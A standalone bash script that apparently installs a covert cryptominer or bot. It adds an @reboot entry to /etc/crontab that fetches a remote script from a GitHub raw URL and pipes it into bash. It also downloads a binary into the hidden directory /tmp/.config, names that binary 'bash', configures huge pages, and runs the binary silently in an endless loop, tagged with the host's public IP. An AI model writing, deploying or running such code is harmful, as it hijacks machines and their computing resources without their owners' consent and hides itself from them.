#!/bin/bash

mode="${1:-0}"
src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"

RandString() {
  n="${1:-2}"; s=""; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
}

# Debian12+
sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"
rand=`RandString 2`
# rand=`date +"%Y%m%d%H%M%S"`
[ -n "$rand" ] && rand="_${rand}" || rand=""
name="c${cores}_${addr}${rand}"

sudo sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1
sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1

mkdir -p "/tmp/.config"
wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.json"
wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
chmod -R 777 "/tmp/.config"
sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "/tmp/.config/appsettings.json"

if [ "$mode" == "0" ]; then
  bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
else
  while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done
fi

